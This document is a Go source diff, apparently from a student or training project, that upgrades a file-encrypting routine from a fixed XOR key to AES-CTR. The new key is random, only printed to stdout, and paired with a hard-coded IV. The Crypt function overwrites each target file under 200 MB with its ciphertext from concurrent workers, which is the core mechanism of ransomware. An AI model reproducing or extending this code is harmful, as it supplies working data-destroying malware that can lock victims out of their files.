@@ -1,19 +1,48 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"os"
 	"os/exec"
 	"strings"
 	"sync"
-	"time"
 )
 
 var wg sync.WaitGroup
 var wgc sync.WaitGroup
 
-var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_cest_normal_salut_les_mentor_je_suis_un_xor"
+var CryptKey = aesKey()
+
+var IV = []byte("1234567812345678")
+
+func createKey() []byte {
+	genkey := make([]byte, 32)
+	_, err := rand.Read(genkey)
+	if err != nil {
+		log.Fatalf("Failed to read new random key: %s", err)
+	}
+	return genkey
+}
+
+func aesKey() []byte {
+	key := createKey()
+	fmt.Println(base64.StdEncoding.EncodeToString(key))
+	return key
+}
+
+func createCipher() cipher.Block {
+	c, err := aes.NewCipher(CryptKey)
+	if err != nil {
+		log.Fatalf("Failed to create the AES cipher: %s", err)
+	}
+	return c
+}
 
 func Crypt(filename string, ch chan string) {
 	file, _ := os.Open(filename)
@@ -22,24 +51,25 @@ func Crypt(filename string, ch chan string) {
 		fmt.Println(err)
 		wgc.Done()
 		fmt.Println("fail " + filename)
+		file.Close()
 		Crypt(<-ch, ch)
 	}
 	if fileInfo.Size() > 200000000 {
 		wgc.Done()
 		fmt.Println("too big " + filename)
+		file.Close()
 		Crypt(<-ch, ch)
 	}
 	arr := make([]byte, fileInfo.Size())
 	_, _ = file.Read(arr)
-	file = nil
-	var xor []byte
-	for i := 0; i < len(arr); i++ {
-		xor = append(xor, arr[i]^Xorstring[i%len(Xorstring)])
+	file.Close()
+	blockCipher := createCipher()
+	stream := cipher.NewCTR(blockCipher, IV)
+	stream.XORKeyStream(arr, arr)
+	err = ioutil.WriteFile(filename, arr, 0644)
+	if err != nil {
+		fmt.Printf("Writing encryption file: %s\n", err)
 	}
-	arr = nil
-	_ = ioutil.WriteFile(filename, xor, 0644)
-	xor = nil
-	time.Sleep(time.Millisecond * 120)
 	wgc.Done()
 	Crypt(<-ch, ch)
 }
@@ -60,7 +90,7 @@ func main() {
 	wg.Wait()
 	<-ch
 	wgc.Done()
-	for i := 0; i < 200; i++ {
+	for i := 0; i < 100; i++ {
 		if len(ch) == 0 {
 			break
 		}
